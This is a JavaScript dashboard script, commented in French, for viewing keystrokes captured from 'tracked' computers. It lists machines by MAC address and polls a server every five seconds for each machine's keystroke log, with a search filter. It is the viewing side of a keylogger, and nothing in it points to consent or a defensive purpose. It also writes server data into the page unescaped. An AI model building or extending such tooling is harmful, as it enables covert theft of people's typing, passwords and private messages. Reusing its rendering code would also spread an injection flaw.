let logData = []; // Stocke les frappes récupérées

document.addEventListener("DOMContentLoaded", function () {
    const computerSelect = document.getElementById("computer-list"); // Sélecteur des machines
    const logContent = document.getElementById("log-content"); // Contenu des logs affichés
    const mainMessage = document.getElementById("main-message"); // Message par défaut
    const recordingStatus = document.getElementById("recordingStatus"); // Indicateur d'enregistrement

    // Récupérer la liste des machines enregistrées
    async function fetchComputers() {
        try {
            const response = await fetch('/api/get_users');
            const data = await response.json();

            // Réinitialise la liste et ajoute l'option par défaut
            computerSelect.innerHTML = '<option value="">Select a tracked computer</option>';

            data.forEach(mac => {
                const option = document.createElement('option');
                option.value = mac;
                option.textContent = mac;
                computerSelect.appendChild(option);
            });
        } catch (error) {
            console.error("Error :", error);
        }
    }

    // Récupérer les frappes enregistrées pour la machine sélectionnée
    async function fetchData() {
        const selectedMac = computerSelect.value;
        if (!selectedMac) return;

        try {
            const response = await fetch(`/api/get_data/${selectedMac}`); // Requête corrigée
            const data = await response.json();

            console.log("Données récupérées :", data);
            if (data.error) {
                logContent.innerHTML = `<p style="color: red;">${data.error}</p>`;
                return;
            }

            logData = data || [];
            displayContent(logData);
        } catch (error) {
            console.error("Erreur lors de la récupération des logs :", error);
        }
    }

    // Afficher les logs dans l'interface
    function displayContent(content) {
        logContent.innerHTML = content.map(entry => `<p>${JSON.stringify(entry)}</p>`).join('');
    }

    // Filtrer les frappes en fonction de la recherche utilisateur
    function searchContent(query) {
        if (!query) return displayContent(logData);
        const filtered = logData.filter(entry => JSON.stringify(entry).includes(query));
        displayContent(filtered);
    }

    // Lancer la récupération des données toutes les 5 secondes
    fetchComputers();
    setInterval(fetchData, 5000);

    // Gérer le changement de sélection d'un ordinateur
    computerSelect.addEventListener("change", function () {
        if (computerSelect.value) {
            mainMessage.style.display = "none";
            recordingStatus.style.display = "block";
            fetchData();
        }
    });
});
